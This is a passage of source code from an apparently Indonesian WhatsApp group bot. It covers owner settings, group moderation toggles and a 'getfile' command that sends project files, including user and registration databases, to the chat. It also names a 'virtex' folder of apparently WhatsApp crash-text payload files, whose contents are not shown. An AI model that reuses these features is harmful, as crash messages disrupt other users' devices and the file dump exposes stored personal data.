if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner()
if (!q) return reply(`Teks?`)
if ((args[0]) === `${q}` ) {
ownerName = `${q}`
setReply(`Berhasil mengubah nama owner ke 「 ${q} 」`)
}
break
case 'setnomerowner':
case 'setnoowner':
if (!isRegist) return onlyRegist() 
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return reply(`Nomernya?`)
if (args[0].startsWith('08')) return setReply('Gunakan kode negara kak')
if ((args[0]) === `${q}` ) {
nomerOwner = `${q}`
setReply(`Berhasil mengubah nomer owner ke 「 ${q} 」`)
}
break
case 'setlang':
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
try{
let translate = require('translate-google-api')
let tld = 'cn'
let result = await translate(`${text}`, {tld,to: q,})
language = q
setReply(`Berhasil mengubah bahasa ke ${q}`)
} catch(err){
setReply("Daftar bahasa yang didukung: https://cloud.google.com/translate/docs/languages")
}
break
case 'setimgdoc':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isImage || isQuotedImage){
let delb = await atak.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./media/image/thumbnaildokumen.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image doc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break
case 'setimgreply':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isImage || isQuotedImage){
let delb = await atak.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./media/image/reply.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image reply`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
}
}
break;
case 'setfakegif':{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (isImage || isQuotedImage){
let delb = await atak.downloadAndSaveMediaMessage(quoted)
await fse.copy(delb,`./media/image/fake gif.jpeg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah fake gif`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break;
case 'getfile':
try{
if (!isRegist) return onlyRegist()
if (!isOwner && !ridho.key.fromMe) return onlyOwner() 
if (!q) return setReply(`penggunaan\n${prefix+command} namafile\n${prefix+command} database\n${prefix+command} lib namafile\n${prefix+command} message namafile`)
if ((args[0]) === "index.js" || (args[0]) === "keepalive.js" || (args[0]) === "settings.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "package.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "README.md") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/md', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "replit.nix") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/nix', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "replit.nox") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/nox', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "speed.py") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/py', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === ".replit") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/replit', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "replit_zip_error_log.txt") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/txt', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "yarn-error.log") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/log', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "Procfile") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./${args[0]}`)
await atak.sendMessage(from, { document: file, mimetype: 'application/Procfile', fileName: `${args[0]}` }, { quoted: ridho })
} else if ((args[0]) === "assets" && (args[1]) === "style.css") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./assets/style.css`)
await atak.sendMessage(from, { document: file, mimetype: 'application/css', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "routers" && (args[1]) === "app-route.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./routers/app-route.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "views" && (args[1]) === "home.ejs") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./views/home.ejs`)
await atak.sendMessage(from, { document: file, mimetype: 'application/ejs', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "allcommand.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/allcommand.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "anonymous.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/anonymous.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "antispam.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/antispam.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "banned.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/banned.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "blockcmd.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/blockcmd.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "claim.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/claim.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "darah.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/darah.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "dashboard.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/dashboard.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "data.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/data.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "hitToday.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/hitToday.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "inventory.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/inventory.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "listerror.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/listerror.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "monay.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/monay.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "premium.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/premium.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "register.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/register.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "sewa.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/sewa.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "stick.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/stick.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "user.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/user.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "userblocked.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/userblocked.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "database" && (args[1]) === "vn.json") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./database/vn.json`)
await atak.sendMessage(from, { document: file, mimetype: 'application/json', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "inventory.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/inventory.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "antispam.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/antispam.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "antivirus.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/antivirus.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "banned.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/banned.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "blockcmd.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/blockcmd.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "blockuser.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/blockuser.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "buruan.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/buruan.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "cerpen.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/cerpen.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "color.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/color.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "convert.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/convert.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "converter.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/converter.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "darah.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/darah.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "exif.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/exif.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "functions.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/functions.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "monay.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/monay.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "myfunc.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/myfunc.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "pinterest.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/pinterest.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "premium.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/premium.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "register.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/register.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "scraper.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/scraper.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "sewa.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/sewa.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "simple.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/simple.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "totalcmd.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/totalcmd.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "totalerror.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/totalerror.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "uploader.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/uploader.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "lib" && (args[1]) === "user.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./lib/user.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "group.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/group.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "help1.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help1.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "help2.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help2.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "help3.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/help3.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "mess.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/mess.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "message.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/message.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "msg.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/msg.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "sewabot.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/sewabot.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "stickerPack.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/stickerPack.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "message" && (args[1]) === "vn.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./message/vn.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv1.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv1.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv2.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv2.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "ngazapv3.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/ngazapv3.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex6.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex6.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "virtex" && (args[1]) === "virtex7.js") {
await setReply(`Getting File`)
let file = await fs.readFileSync(`./virtex/virtex7.js`)
await atak.sendMessage(from, { document: file, mimetype: 'application/js', fileName: `${args[1]}` }, { quoted: ridho })
} else if ((args[0]) === "media") {
setReply(`Terlalu banyak file kak`)
}
} catch(err){
console.log(err)
setReply(`${err}`)
}
break
//================================================================================\\
case 'antilink':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiLink) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiLink) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur antilink telah di matikan`
setReply(ih)
} else if (!q) {
atak.sendButMessage(from, `MODE ANTI LINK`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilink on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilink off`, buttonText: { displayText: Off },type: 1}]);
}
}
break;
case 'antilinkgc':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntilinkGc) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur antilink group telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntilinkGc) return setReply('Udah mati')
removeDataId (command, from, DataId)
let ih =`Fitur antilink group telah di matikan`
setReply(ih)
}else if (!q) {
atak.sendButMessage(from, `MODE ANTI LINK GROUP`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antilinkgc on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antilinkgc off`, buttonText: { displayText: Off },type: 1}]);
}
}
break;
case 'antivirtex':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin() 
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntiVirtex) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan antivirtex!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntiVirtex) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan antivirtex!");
} else if (!q) {
atak.sendButMessage(from, `MODE Anti Virtex`, `Silahkan pilih salah satu`, 
[{buttonId: `${prefix}antivirtex on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}antivirtex off`, buttonText: { displayText: `off`,}, type: 1}, ]);
}
}
break;
case 'antiasing':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isKickarea) return setReply("Sudah aktif!!");
addDataId(from, command, DataId)
setReply("Sukses mengaktifkan kickarea!");
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isKickarea) return setReply("Udah off!!");
removeDataId (command, from, DataId)
setReply("Sukses mematikan kickarea!");
} else if (!q) {
atak.sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, 
[{buttonId: `${prefix}kickarea on`, buttonText: { displayText: `on`,},type: 1,},
{buttonId: `${prefix}kickarea off`, buttonText: { displayText: `off`,}, type: 1}, ]);
}
}
break;
case 'antihidetag':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if(!checkDataName(command, from, DataId)) { createDataId(command, DataId) }
if ((args[0]) === 'on' || (args[0]) === 'enable' || (args[0]) === '1' ) {
if (isAntihidetag) return setReply('Fitur sudah aktif kak')
addDataId(from, command, DataId)
let ih =`Fitur anti hidetag telah di aktifkan`
setReply(ih)
} else  if ((args[0]) === 'off' || (args[0]) === 'disable' || (args[0]) === '0') {
if (!isAntihidetag) return setReply('Fitur Anti link sudah off')
removeDataId (command, from, DataId)
let ih =`Fitur anti hidetag telah di matikan`
setReply(ih)
} else if (!q) {
atak.sendButMessage(from, `MODE ANTI TAG`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}antihidetag on`, buttonText: {displayText: On },type: 1},
{buttonId: `${prefix}antihidetag off`, buttonText: { displayText: Off },type: 1}]);
}
}
break
case 'infogc': {
if (!isRegist) return onlyRegist()
if(!isGroup) return onlyGroup() 
let _meta = await atak.groupMetadata(from)
console.log(_meta)
let _img = await atak.profilePictureUrl(_meta.id, 'image') 
let caption = `${_meta.subject} - Created on ${moment(_meta.creation * 1000).format('ll')}\n\n` +
`*${_meta.participants.length}* Total Members\n*${_meta.participants.filter(x => x.admin === 'admin').length}* Admin\n*${_meta.participants.filter(x => x.admin === null).length}* Not Admin\n\n` +
`Group ID : ${_meta.id}`
await atak.sendMessage(from,{
caption,
image: await getBuffer(_img)
},
{ quoted: ridho }
)
}
break
case 'linkgc':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
var url = await atak.groupInviteCode(from).catch(() => reply(mess.error.api))
let asu = 'https://chat.whatsapp.com/'+url
setReply(asu)
}
break
case 'setppgc':{
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (isImage || isQuotedImage) {
let media = await atak.downloadAndSaveMediaMessage(quoted)
await atak.updateProfilePicture(from, { url: media })
.then( res => {
setReply(`Sukses`)
fs.unlinkSync(media)
}).catch(() => reply(mess.error.api))
} else {
setReply(`Kirim/balas gambar dengan caption ${command}`)
}
}
break
case 'setnamagc':
case 'setnamegc':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await atak.groupUpdateSubject(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => setReply(mess.error.api))
break
case 'setdesc': 
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (args.length < 2) return reply(`Kirim perintah ${command} teks`)
await atak.groupUpdateDescription(from, q)
.then( res => {
setReply(`Sukses`)
}).catch(() => reply(mess.error.api))
break
case 'gc':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if (!q) return reply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
if (args[0] == "close") {
atak.groupSettingUpdate(from, 'announcement')
setReply(`Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini`)
} else if (args[0] == "open") {
atak.groupSettingUpdate(from, 'not_announcement')
setReply(`Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini`)
} else {
setReply(`Kirim perintah ${command} _options_\nOptions : close & open\nContoh : ${command} close`)
}
break
case 'revoke':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
await atak.groupRevokeInvite(from)
.then( res => {
setReply(`Sukses menyetel tautan undangan grup ini`)
}).catch(() => reply(mess.error.api))
break
case 'hidetag':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
let mem = [];
groupMembers.map( i => mem.push(i.id) )
atak.sendMessage(from, { text: q ? q : '', mentions: mem })
break
case 'infoall': case 'tagall':
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if(!q) {
var inpo = "No inpo"
} else var inpo = q
let members_id = []
let tes = '\n'
await groupMembers.map( i => {
tes += `┣ ⬣@${i.id.split('@')[0]}\n`
members_id.push(i.id) })
mentions(`
*From :* ${pushname}

 Info :  ${inpo}

Total Member : ${groupMembers.length} 

┏━⬣`+tes+`┗━⬣`, members_id, false)
break
case 'kick': {
if (!isRegist) return onlyRegist()
if (!isGroup) return onlyGroup()
if (!isBotGroupAdmins) return onlyBadmin() 
if (!isGroupAdmins && !isOwner) return onlyAdmin()
if(!Input) return setReply("Tag/Mention/Masukan nomer target")
if (Input.startsWith('08')) return setReply('Awali nomor dengan 62')
